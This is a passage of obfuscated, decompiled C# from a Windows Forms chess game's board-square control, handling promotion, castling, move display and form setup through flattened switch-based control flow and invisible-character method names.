        int num11 = (int) Square.\u206B⁭‮‌‫​‮‏⁮‬‫⁮⁯⁬⁯‏‮‪‏‮‏‎‎⁯‬‌‮⁬⁬⁫‭‌‫‮⁪‬⁭⁭⁬‮‮((Form) promotion);
        this.Kind = promotion.Piece;
label_44:
        int num12 = 2138547721;
        while (true)
        {
          uint num13;
          switch ((num13 = (uint) (num12 ^ 1957729796)) % 3U)
          {
            case 0:
              goto label_44;
            case 1:
              num12 = (int) num13 * 2121422860 ^ -930829053;
              continue;
            default:
              goto label_54;
          }
        }
      }
      finally
      {
        if (promotion != null)
        {
label_48:
          int num14 = 153865458;
          while (true)
          {
            uint num15;
            switch ((num15 = (uint) (num14 ^ 1957729796)) % 4U)
            {
              case 1:
                num14 = (int) num15 * 1737356036 ^ -174557492;
                continue;
              case 2:
                Square.\u202B‫‫⁬⁮‫‭⁮‎⁬‪‮‬‎⁭⁬⁫⁪⁮‏‮⁯‪‭‌‮‭‍‬​‮‭‏‎‪‮‭‌​‮‮((IDisposable) promotion);
                num14 = (int) num15 * 1099402637 ^ 1244685967;
                continue;
              case 3:
                goto label_48;
              default:
                goto label_53;
            }
          }
        }
label_53:;
      }
label_54:
label_55:
      int num16 = 1268132785;
label_56:
      while (true)
      {
        uint num17;
        bool flag6;
        bool flag7;
        Square square1;
        int file;
        int rank;
        bool flag8;
        Square square2;
        switch ((num17 = (uint) (num16 ^ 1957729796)) % 38U)
        {
          case 0:
            num16 = (int) num17 * 1940253155 ^ 1986761535;
            continue;
          case 1:
            square1.Piece = chessPiece;
            int num18 = flag1 ? -668441758 : (num18 = -1205445112);
            num16 = num18 ^ (int) num17 * -904592203;
            continue;
          case 2:
            file = chessPiece.Current.File;
            rank = chessPiece.Current.Rank;
            if (file != 5)
            {
              num16 = (int) num17 * -1504588591 ^ 379164774;
              continue;
            }
            square2 = this.Board[7, rank];
            break;
          case 3:
            this.Board.WhitePieces[chessPiece.Id].Current = square1;
            this.Board.WhiteCanCastleQueenSide = true;
            this.Board.WhiteCanCastleKingSide = true;
            num16 = (int) num17 * -1340729970 ^ 2535961;
            continue;
          case 4:
            int num19;
            num16 = num19 = !flag6 ? 842782384 : (num19 = 252970420);
            continue;
          case 5:
            goto label_92;
          case 6:
            int num20 = this.Board.lights.KingColorOnCheck != this.Piece.Color ? 56949227 : (num20 = 2130765820);
            num16 = num20 ^ (int) num17 * 1402519066;
            continue;
          case 7:
            num16 = 1950188494;
            continue;
          case 8:
            num16 = (int) num17 * -2002500771 ^ 1743057109;
            continue;
          case 9:
            flag6 = this.Board.lights.IsOnCheck;
            num16 = (int) num17 * -441649893 ^ -1986239357;
            continue;
          case 10:
            flag6 = true;
            int num21 = this.Piece.Kind != Pieces.King ? -1164470580 : (num21 = -1535913679);
            num16 = num21 ^ (int) num17 * -118192127;
            continue;
          case 11:
            this.SwitchPlayer();
            num16 = (int) num17 * -492990559 ^ -850368524;
            continue;
          case 12:
            num16 = (int) num17 * -957530427 ^ -520967961;
            continue;
          case 13:
            goto label_57;
          case 14:
            this.Board.lights.FindAllMoves();
            num16 = (int) num17 * -1720620684 ^ 757906936;
            continue;
          case 15:
            num16 = (int) num17 * -1575574025 ^ -1133256578;
            continue;
          case 16:
            from.Piece = this.Piece;
            this.Piece = (ChessPiece) null;
            num16 = (int) num17 * 975126818 ^ 526941540;
            continue;
          case 17:
            flag8 = chessPiece != null;
            num16 = 1683836237;
            continue;
          case 18:
            this.Board.lights.FindAllMoves();
            num16 = 1478853194;
            continue;
          case 19:
            num16 = (int) num17 * 681494676 ^ 1670313636;
            continue;
          case 20:
            int num22 = !flag7 ? -1305754058 : (num22 = -651792753);
            num16 = num22 ^ (int) num17 * 2102677617;
            continue;
          case 21:
            goto label_55;
          case 22:
            num16 = 1720276472;
            continue;
          case 23:
            this.Board.WhitePieces[from.Piece.Id].Current = from;
            num16 = (int) num17 * -1172080298 ^ -1579692524;
            continue;
          case 24:
            num16 = (int) num17 * -524129805 ^ 2023491958;
            continue;
          case 25:
            this.Board[file, rank].Piece = (ChessPiece) null;
            num16 = 348855651;
            continue;
          case 26:
            num16 = (int) num17 * 1122100853 ^ -1242974744;
            continue;
          case 27:
            PlaySound.Play();
            num16 = 1069281019;
            continue;
          case 28:
            square2 = this.Board[0, rank];
            break;
          case 29:
            int num23 = this.Board.lights.IsOnCheck ? 7407201 : (num23 = 719423702);
            num16 = num23 ^ (int) num17 * -1752295405;
            continue;
          case 30:
            this.Board.BlackPieces[from.Piece.Id].Current = from;
            num16 = 1036460681;
            continue;
          case 31:
            this.Board.BlackCanCastleKingSide = true;
            num16 = (int) num17 * 363889202 ^ -1924427223;
            continue;
          case 32:
            this.msg = \u003CModule\u003E.\u206B‮‎⁫⁮⁮‭‬⁭⁭⁭‮⁬‬‍‌‬‏⁮‪‪‏⁯‮‫‬‮‎​‫⁬⁮‪⁭⁪⁫⁪‍⁫‪‮<string>(3101842718U);
            num16 = (int) num17 * 1667675442 ^ -742293962;
            continue;
          case 33:
            num16 = (int) num17 * 1025867664 ^ 1941071013;
            continue;
          case 34:
            this.msg = \u003CModule\u003E.\u206B‮‎⁫⁮⁮‭‬⁭⁭⁭‮⁬‬‍‌‬‏⁮‪‪‏⁯‮‫‬‮‎​‫⁬⁮‪⁭⁪⁫⁪‍⁫‪‮<string>(1279321928U);
            flag7 = flag1;
            num16 = (int) num17 * -120500228 ^ 710735942;
            continue;
          case 35:
            int num24 = flag8 ? 1960020513 : (num24 = 863496503);
            num16 = num24 ^ (int) num17 * 1567385639;
            continue;
          case 36:
            num16 = 1297921801;
            continue;
          case 37:
            this.Board.BlackPieces[chessPiece.Id].Current = square1;
            this.Board.BlackCanCastleQueenSide = true;
            num16 = 97139535;
            continue;
          default:
            goto label_50;
        }
        square1 = square2;
        num16 = 80116523;
      }
label_57:
      return;
label_50:
      return;
label_92:
      this.Board.lights.IsOnCheck = false;
      num16 = 1918363930;
      goto label_56;
    }

    private ChessPiece handleBlackCastling()
    {
      ChessPiece chessPiece1 = (ChessPiece) null;
label_1:
      int num1 = 1416931166;
      ChessPiece chessPiece2;
      while (true)
      {
        uint num2;
        bool flag1;
        bool flag2;
        bool flag3;
        Square square1;
        Square square2;
        bool flag4;
        bool flag5;
        int num3;
        int num4;
        switch ((num2 = (uint) (num1 ^ 84480047)) % 38U)
        {
          case 0:
            int num5;
            num1 = num5 = this.Piece.Current.File == 6 ? 941078678 : (num5 = 242676688);
            continue;
          case 1:
            int num6 = !flag5 ? 1670535997 : (num6 = 222876047);
            num1 = num6 ^ (int) num2 * -1880971908;
            continue;
          case 2:
            chessPiece2 = chessPiece1;
            num1 = 950938222;
            continue;
          case 3:
            int num7 = flag1 ? -1790869672 : (num7 = -1314455295);
            num1 = num7 ^ (int) num2 * -1456877693;
            continue;
          case 4:
            num1 = (int) num2 * 807901384 ^ 204469129;
            continue;
          case 5:
            num1 = (int) num2 * 1250362403 ^ -101369599;
            continue;
          case 6:
            this.Board.BlackPieces[square1.Piece.Id].Current = square1;
            num1 = (int) num2 * 930694 ^ -518021631;
            continue;
          case 7:
            if (this.Board.BlackCanCastleKingSide)
            {
              num3 = 1;
              break;
            }
            num1 = (int) num2 * 934351632 ^ -206688960;
            continue;
          case 8:
            int num8 = !flag3 ? -1557580183 : (num8 = -690577338);
            num1 = num8 ^ (int) num2 * -2117483778;
            continue;
          case 9:
            flag1 = Square.\u206A⁮​⁬⁭‍​⁫‫⁫‭⁭‏⁭​⁭‏​‏‪⁭⁪⁮⁯⁪‎⁪‍‏‎⁯⁫⁮‮‮‫‎‪‫‫‮(this.Piece.Home.Name, \u003CModule\u003E.\u206D‏⁮‍⁭‎⁯‎⁪‫‬⁬‍⁮‭⁯‫⁯‌⁪‏‎‌‭⁫‬‪‎‬⁫‪‬⁪‬‬⁪‍⁮⁪⁫‮<string>(2775329748U));
            num1 = (int) num2 * -1058692656 ^ 1824381618;
            continue;
          case 10:
            num1 = 922578096;
            continue;
          case 11:
            if (this.Piece.Kind != Pieces.King)
            {
              num1 = (int) num2 * 579692429 ^ 236436501;
              continue;
            }
            num4 = 1;
            goto label_30;
          case 12:
            square1 = this.Board[3, 7];
            square1.Piece = this.Board[0, 7].Piece;
            this.Board[0, 7].Piece = (ChessPiece) null;
            num1 = (int) num2 * 1922081458 ^ -472419717;
            continue;
          case 13:
            num1 = (int) num2 * 1191106047 ^ 564042259;
            continue;
          case 14:
            num1 = (int) num2 * 2083893676 ^ -1517334907;
            continue;
          case 15:
            this.Board.BlackCanCastleKingSide = false;
            num1 = (int) num2 * 1485274652 ^ -895616497;
            continue;
          case 16:
            num1 = (int) num2 * 783400332 ^ 1313183425;
            continue;
          case 17:
            square2 = this.Board[5, 7];
            square2.Piece = this.Board[7, 7].Piece;
            num1 = (int) num2 * -270571356 ^ -1274310030;
            continue;
          case 18:
            chessPiece1 = square1.Piece;
            num1 = (int) num2 * -1903230034 ^ 1379097365;
            continue;
          case 19:
            this.Board.BlackCanCastleKingSide = false;
            num1 = 931156617;
            continue;
          case 20:
            flag5 = this.Piece.Kind == Pieces.Rook;
            num1 = (int) num2 * -671014071 ^ -1106834242;
            continue;
          case 21:
            flag2 = this.Piece.Current.File == 2;
            num1 = (int) num2 * -913503726 ^ -733261178;
            continue;
          case 22:
            num1 = (int) num2 * -1527568470 ^ 357889316;
            continue;
          case 23:
            int num9 = !flag2 ? -703521394 : (num9 = -678012700);
            num1 = num9 ^ (int) num2 * 1019195369;
            continue;
          case 24:
            goto label_1;
          case 25:
            num1 = (int) num2 * -161703034 ^ -1796322971;
            continue;
          case 26:
            num1 = 1490274054;
            continue;
          case 27:
            this.Board.BlackCanCastleQueenSide = false;
            num1 = 1498019348;
            continue;
          case 28:
            num1 = 1931133563;
            continue;
          case 29:
            this.Board[7, 7].Piece = (ChessPiece) null;
            num1 = (int) num2 * -674724953 ^ 395195692;
            continue;
          case 30:
            this.Board.BlackCanCastleQueenSide = false;
            num1 = (int) num2 * 351696850 ^ 54782729;
            continue;
          case 31:
            num1 = 2026665373;
            continue;
          case 32:
            int num10 = flag4 ? 1191728389 : (num10 = 1825215286);
            num1 = num10 ^ (int) num2 * -2072909224;
            continue;
          case 33:
            num1 = (int) num2 * -6390826 ^ 888242232;
            continue;
          case 35:
            num3 = this.Board.BlackCanCastleQueenSide ? 1 : 0;
            break;
          case 36:
            this.Board.BlackPieces[square2.Piece.Id].Current = square2;
            chessPiece1 = square2.Piece;
            num1 = (int) num2 * 1015016273 ^ 943664272;
            continue;
          case 37:
            num4 = this.Piece.Kind == Pieces.Rook ? 1 : 0;
            goto label_30;
          default:
            goto label_45;
        }
        flag3 = num3 != 0;
        num1 = 944518953;
        continue;
label_30:
        flag4 = num4 != 0;
        num1 = 1207359997;
      }
label_45:
      return chessPiece2;
    }

    private ChessPiece handleWhiteCastling()
    {
      ChessPiece chessPiece1 = (ChessPiece) null;
label_1:
      int num1 = 1013582123;
      ChessPiece chessPiece2;
      while (true)
      {
        uint num2;
        bool flag1;
        Square square1;
        Square square2;
        bool flag2;
        bool flag3;
        bool flag4;
        int num3;
        int num4;
        switch ((num2 = (uint) (num1 ^ 528946466)) % 36U)
        {
          case 0:
            int num5 = flag4 ? -541746079 : (num5 = -78793955);
            num1 = num5 ^ (int) num2 * 1929485449;
            continue;
          case 1:
            num1 = (int) num2 * -559263767 ^ 1418759583;
            continue;
          case 2:
            goto label_1;
          case 3:
            int num6;
            num1 = num6 = this.Piece.Current.File != 6 ? 2013611197 : (num6 = 1032339820);
            continue;
          case 4:
            num1 = (int) num2 * -741611950 ^ -1080256031;
            continue;
          case 5:
            flag3 = this.Piece.Current.File == 2;
            num1 = 1493506880;
            continue;
          case 6:
            square1 = this.Board[3, 0];
            square1.Piece = this.Board[0, 0].Piece;
            num1 = (int) num2 * -1967207533 ^ -2052696023;
            continue;
          case 7:
            int num7 = !flag1 ? 489741946 : (num7 = 590144918);
            num1 = num7 ^ (int) num2 * 1278213491;
            continue;
          case 8:
            this.Board.WhiteCanCastleKingSide = false;
            num1 = 40415355;
            continue;
          case 9:
            num1 = 981703125;
            continue;
          case 10:
            int num8 = !flag2 ? -35687521 : (num8 = -668310432);
            num1 = num8 ^ (int) num2 * -163301501;
            continue;
          case 11:
            this.Board.WhiteCanCastleQueenSide = false;
            this.Board.WhiteCanCastleKingSide = false;
            num1 = 572463723;
            continue;
          case 12:
            this.Board[7, 0].Piece = (ChessPiece) null;
            this.Board.WhitePieces[square2.Piece.Id].Current = square2;
            num1 = (int) num2 * 1853453907 ^ -1872661093;
            continue;
          case 13:
            num1 = (int) num2 * 1558028710 ^ -1363838171;
            continue;
          case 14:
            num1 = (int) num2 * 2038304716 ^ -2076284986;
            continue;
          case 16:
            if (this.Piece.Kind != Pieces.King)
            {
              num1 = (int) num2 * -1722304573 ^ 1723931102;
              continue;
            }
            num3 = 1;
            goto label_30;
          case 17:
            num1 = (int) num2 * -1994522457 ^ 552181030;
            continue;
          case 18:
            int num9 = flag3 ? 1088701172 : (num9 = 728538161);
            num1 = num9 ^ (int) num2 * 1808636640;
            continue;
          case 19:
            chessPiece2 = chessPiece1;
            num1 = 1182314672;
            continue;
          case 20:
            this.Board[0, 0].Piece = (ChessPiece) null;
            num1 = (int) num2 * 1352027499 ^ -224925958;
            continue;
          case 21:
            num1 = 1495061323;
            continue;
          case 22:
            num1 = (int) num2 * 1059944299 ^ 941446238;
            continue;
          case 23:
            int num10 = Square.\u206A⁮​⁬⁭‍​⁫‫⁫‭⁭‏⁭​⁭‏​‏‪⁭⁪⁮⁯⁪‎⁪‍‏‎⁯⁫⁮‮‮‫‎‪‫‫‮(this.Piece.Home.Name, \u003CModule\u003E.\u200B​⁯⁯⁬‮​⁫⁪⁯⁬⁯‮‭‭⁫⁫⁮⁪⁪‌‏⁫‪⁫‍⁭‌⁯⁬⁭‮‏‪‪‏‫⁪‌‪‮<string>(912874240U)) ? 1422700360 : (num10 = 1666671306);
            num1 = num10 ^ (int) num2 * -403246180;
            continue;
          case 24:
            this.Board.WhitePieces[square1.Piece.Id].Current = square1;
            chessPiece1 = square1.Piece;
            num1 = (int) num2 * 1145522657 ^ 920971158;
            continue;
          case 25:
            num1 = (int) num2 * 1116452847 ^ 194684780;
            continue;
          case 26:
            this.Board.WhiteCanCastleQueenSide = false;
            num1 = (int) num2 * 1885618252 ^ 1752813951;
            continue;
          case 27:
            flag1 = this.Piece.Kind == Pieces.Rook;
            num1 = (int) num2 * 2026552318 ^ -1977989633;
            continue;
          case 28:
            num3 = this.Piece.Kind == Pieces.Rook ? 1 : 0;
            goto label_30;
          case 29:
            chessPiece1 = square2.Piece;
            num1 = (int) num2 * -894918351 ^ 961253152;
            continue;
          case 30:
            square2 = this.Board[5, 0];
            num1 = (int) num2 * -799392355 ^ -1439471444;
            continue;
          case 31:
            num4 = this.Board.WhiteCanCastleKingSide ? 1 : 0;
            break;
          case 32:
            square2.Piece = this.Board[7, 0].Piece;
            num1 = (int) num2 * 689334982 ^ -1616911032;
            continue;
          case 33:
            if (this.Board.WhiteCanCastleKingSide)
            {
              num4 = 1;
              break;
            }
            num1 = (int) num2 * 1040306026 ^ -1994558177;
            continue;
          case 34:
            num1 = (int) num2 * 86756232 ^ 1283539817;
            continue;
          case 35:
            num1 = 2076605881;
            continue;
          default:
            goto label_43;
        }
        flag2 = num4 != 0;
        num1 = 467308352;
        continue;
label_30:
        flag4 = num3 != 0;
        num1 = 2085185450;
      }
label_43:
      return chessPiece2;
    }

    public void ShowAllMoves()
    {
    }

    public void ShowSelectedPieceMoves()
    {
    }

    public void HideMove()
    {
label_1:
      int num1 = 74217454;
      while (true)
      {
        uint num2;
        switch ((num2 = (uint) (num1 ^ 985504255)) % 3U)
        {
          case 0:
            goto label_3;
          case 1:
            Square.\u206D‍‭‪‮‎⁫⁪‌⁮⁮⁫⁫⁪‭‏⁭‫‬⁯⁫⁭‫⁮⁯⁮‌‮⁭⁯‎‌‌‫‍⁪‎‎‫‪‮((Control) this.panel1, (Image) null);
            num1 = (int) num2 * 473234893 ^ -462577772;
            continue;
          case 2:
            goto label_1;
          default:
            goto label_5;
        }
      }
label_3:
      return;
label_5:;
    }

    protected override void Dispose(bool disposing)
    {
label_1:
      int num1 = -2106988894;
      while (true)
      {
        uint num2;
        bool flag;
        int num3;
        switch ((num2 = (uint) (num1 ^ -1373051303)) % 10U)
        {
          case 0:
            goto label_1;
          case 1:
            num1 = (int) num2 * 1716097701 ^ 110565795;
            continue;
          case 2:
            num1 = (int) num2 * -983257529 ^ 1652919525;
            continue;
          case 3:
            base.Dispose(disposing);
            num1 = -2102272762;
            continue;
          case 4:
            Square.\u202B‫‫⁬⁮‫‭⁮‎⁬‪‮‬‎⁭⁬⁫⁪⁮‏‮⁯‪‭‌‮‭‍‬​‮‭‏‎‪‮‭‌​‮‮((IDisposable) this.components);
            num1 = (int) num2 * 19609089 ^ -1375205072;
            continue;
          case 5:
            if (disposing)
            {
              num1 = (int) num2 * 1834117098 ^ 680317357;
              continue;
            }
            num3 = 0;
            break;
          case 6:
            int num4 = flag ? 1912714391 : (num4 = 1427765132);
            num1 = num4 ^ (int) num2 * 2026046955;
            continue;
          case 7:
            num1 = (int) num2 * 789787087 ^ -1446354091;
            continue;
          case 8:
            num3 = this.components != null ? 1 : 0;
            break;
          case 9:
            goto label_3;
          default:
            goto label_15;
        }
        flag = num3 != 0;
        num1 = -285774651;
      }
label_3:
      return;
label_15:;
    }

    private void InitializeComponent()
    {
      Square.\u206A⁮‎⁮⁯⁫‮‫‌⁮‮⁮‌‮‫​‎‍‎‭⁫‏‎‭‏‌‎⁪‍‪​​‌‮‏⁪⁯‬⁮⁬‮((Control) this);
label_1:
      int num1 = -27264133;
      while (true)
      {
        uint num2;
        switch ((num2 = (uint) (num1 ^ -562491473)) % 10U)
        {
          case 0:
            goto label_1;
          case 1:
            Square.\u202A‎‫‌‌‭‎‎⁯‫⁭⁯‍​‬⁬‍⁭⁯‍‌‎‫⁫‫⁫​⁬‌⁬⁬⁫‎‮⁬⁭⁫‫‬‮((Control) this, ImageLayout.Center);
            num1 = (int) num2 * 1480305595 ^ -1650459977;
            continue;
          case 2:
            Square.\u200E⁭​‫⁯‍⁬‭‏⁬⁬⁪‮‪‪‫⁪⁭‏⁭‪‍⁪‬⁮​⁬‮‍‌‎‍‭⁪‫‌‏‭‎‪‮((ContainerControl) this, AutoScaleMode.Font);
            num1 = (int) num2 * -1142455570 ^ 485158956;
            continue;
          case 3:
            num1 = (int) num2 * 1566770901 ^ -1556327463;
            continue;
          case 4:
            num1 = (int) num2 * -55385074 ^ 360712509;
            continue;
          case 5:
            this.Name = \u003CModule\u003E.\u206F‭‌⁭‍⁪‬‏⁭⁭‫⁬‬​‏‍‭‌​⁬‭‏‎⁭‎‪‏⁮⁫⁪‎⁮⁭⁬⁫‎‏‎‮‏‮<string>(3460998525U);
            num1 = (int) num2 * 1286850362 ^ -396842498;
            continue;
          case 6:
            num1 = (int) num2 * -1217798663 ^ 1808663771;
            continue;
          case 8:
            Square.\u200F⁮⁭‮⁬⁭‫‏‎‍​⁬⁬‫‭​​‪‭⁪‎‫⁫‮‎‌‏‬⁬⁭‫⁬‭⁫‏‌‭⁮‮‏‮((ContainerControl) this, new SizeF(6f, 13f));
            num1 = (int) num2 * -1519837415 ^ -476902311;
            continue;
          case 9:
            Square.\u202C‬‮‌⁪‌⁭‬‌‮‌‭‮‪⁫⁮⁬​‭‏‭‫⁬⁫‪‫‍‬‬‮‮⁯‬⁪‏​⁫‎​⁪‮((Control) this, new Padding(0));
            num1 = (int) num2 * -252582843 ^ -118265653;
            continue;
          default:
            goto label_11;
        }
      }
label_11:
      Square.\u202E‮‍‬⁮‎‏‮‫⁭‭‪⁭⁬⁮‏‭⁯‭​⁬‌‍⁮‫⁭‌⁭⁭‌‍⁬‎‫⁯⁫⁪⁭‬‬‮((Control) this, new Size(137, 132));
      Square.\u206E‍‫‌‮‭‌‌‫‫⁬⁫​​‌⁪‬‫⁭‭⁬⁬⁪⁪⁬⁯‌⁭‮‪​⁪⁮​⁬‪⁭‭‍⁪‮((Control) this, false);
    }

    static Delegate \u206E​⁪‏‎‌‪‫‌‫‏‏‌‬⁪⁫⁯‮‮⁭‮​‮‏‌‮‌‌⁪‪⁫‭‍‍⁫‏​‭‮‍‮(
      [In] Delegate obj0,
      [In] Delegate obj1)
    {
      return Delegate.Combine(obj0, obj1);
    }

    static Delegate \u206E⁯‪‎‏‬‌⁯‏⁭⁮‫‮‫‪⁬‍‫‬⁫‎⁭⁭‫‬⁮‭‫⁯‌⁭​‭‍‎‏⁪⁯⁮‎‮(
      [In] Delegate obj0,
      [In] Delegate obj1)
    {
      return Delegate.Remove(obj0, obj1);
    }

    static string \u200D⁭‌‮‌‏‬​‏‪⁫‏‎⁮⁬‌‫⁪‎‎‮‮‭‏‪‪⁯‬‫⁫‫⁮⁬⁭‏‎‌‍⁫⁮‮([In] object obj0) => obj0.ToString();

    static string \u206D‫‮‏‍‮‌⁬⁭‬‬⁯⁫‫‏‎‍⁬‫‬‪‭⁭‬⁪‬‍⁮‪‫‎‌⁮‬⁪‏‏‏⁯‍‮(
      [In] string obj0,
      [In] string obj1,
      [In] string obj2)
    {
      return obj0 + obj1 + obj2;
    }

    static char \u202C‏‏⁯⁯⁬‫‬‬‏​‎‎‭⁯⁬⁫⁪⁮‬‭‍‌‫⁭‮‌‏⁯‭‮‍‍‍⁬‫‍⁯‭‪‮([In] string obj0, [In] int obj1) => obj0[obj1];

    static string \u202A‌⁪‪⁭‎‎⁯‮‮⁫⁮⁮⁫⁭‍⁮⁫​⁫⁯⁯⁪⁯‌‍⁯​‭⁭‫‪‮⁫‌‪⁯‎‏‍‮([In] string obj0, [In] string obj1) => obj0 + obj1;

    static MouseButtons \u206D⁬⁮​⁬‍⁬‭⁫⁪‏⁭‪‮‏‬‏‎⁫⁬‪⁪‬‫‭⁯‏⁪​‍‌‮‭⁭⁭‍⁭​‫‭‮(
      [In] MouseEventArgs obj0)
    {
      return obj0.Button;
    }

    static string \u206D‏‫⁭‫‎‭‎⁪⁯⁬​‫⁭‪‎⁬⁮‬​‎‌‬​‏‭‎⁭‏‌‬⁫‏⁯⁮‍⁫⁭⁮‫‮([In] string obj0, [In] object obj1) => string.Format(obj0, obj1);

    static Point \u202D‮⁬‪‍⁮‮‫⁬⁫‬⁮⁭⁭‭​⁪⁮‎‮​⁫⁫⁭‬⁬‌⁯‏⁮⁪⁬⁫⁫‎‫‎​‎‌‮() => Cursor.Position;

    static DialogResult \u206B⁭‮‌‫​‮‏⁮‬‫⁮⁯⁬⁯‏‮‪‏‮‏‎‎⁯‬‌‮⁬⁬⁫‭‌‫‮⁪‬⁭⁭⁬‮‮([In] Form obj0) => obj0.ShowDialog();

    static void \u202B‫‫⁬⁮‫‭⁮‎⁬‪‮‬‎⁭⁬⁫⁪⁮‏‮⁯‪‭‌‮‭‍‬​‮‭‏‎‪‮‭‌​‮‮([In] IDisposable obj0) => obj0.Dispose();

    static bool \u206A⁮​⁬⁭‍​⁫‫⁫‭⁭‏⁭​⁭‏​‏‪⁭⁪⁮⁯⁪‎⁪‍‏‎⁯⁫⁮‮‮‫‎‪‫‫‮([In] string obj0, [In] string obj1) => obj0 == obj1;

    static void \u206D‍‭‪‮‎⁫⁪‌⁮⁮⁫⁫⁪‭‏⁭‫‬⁯⁫⁭‫⁮⁯⁮‌‮⁭⁯‎‌‌‫‍⁪‎‎‫‪‮([In] Control obj0, [In] Image obj1) => obj0.BackgroundImage = obj1;

    static void \u206A⁮‎⁮⁯⁫‮‫‌⁮‮⁮‌‮‫​‎‍‎‭⁫‏‎‭‏‌‎⁪‍‪​​‌‮‏⁪⁯‬⁮⁬‮([In] Control obj0) => obj0.SuspendLayout();

    static void \u200F⁮⁭‮⁬⁭‫‏‎‍​⁬⁬‫‭​​‪‭⁪‎‫⁫‮‎‌‏‬⁬⁭‫⁬‭⁫‏‌‭⁮‮‏‮([In] ContainerControl obj0, [In] SizeF obj1) => obj0.AutoScaleDimensions = obj1;

    static void \u200E⁭​‫⁯‍⁬‭‏⁬⁬⁪‮‪‪‫⁪⁭‏⁭‪‍⁪‬⁮​⁬‮‍‌‎‍‭⁪‫‌‏‭‎‪‮(
      [In] ContainerControl obj0,
      [In] AutoScaleMode obj1)
    {
      obj0.AutoScaleMode = obj1;
    }

    static void \u202A‎‫‌‌‭‎‎⁯‫⁭⁯‍​‬⁬‍⁭⁯‍‌‎‫⁫‫⁫​⁬‌⁬⁬⁫‎‮⁬⁭⁫‫‬‮([In] Control obj0, [In] ImageLayout obj1) => obj0.BackgroundImageLayout = obj1;

    static void \u202C‬‮‌⁪‌⁭‬‌‮‌‭‮‪⁫⁮⁬​‭‏‭‫⁬⁫‪‫‍‬‬‮‮⁯‬⁪‏​⁫‎​⁪‮([In] Control obj0, [In] Padding obj1) => obj0.Margin = obj1;

    static void \u202E‮‍‬⁮‎‏‮‫⁭‭‪⁭⁬⁮‏‭⁯‭​⁬‌‍⁮‫⁭‌⁭⁭‌‍⁬‎‫⁯⁫⁪⁭‬‬‮([In] Control obj0, [In] Size obj1) => obj0.Size = obj1;

    static void \u206E‍‫‌‮‭‌‌‫‫⁬⁫​​‌⁪‬‫⁭‭⁬⁬⁪⁪⁬⁯‌⁭‮‪​⁪⁮​⁬‪⁭‭‍⁪‮([In] Control obj0, [In] bool obj1) => obj0.ResumeLayout(obj1);
  }
}
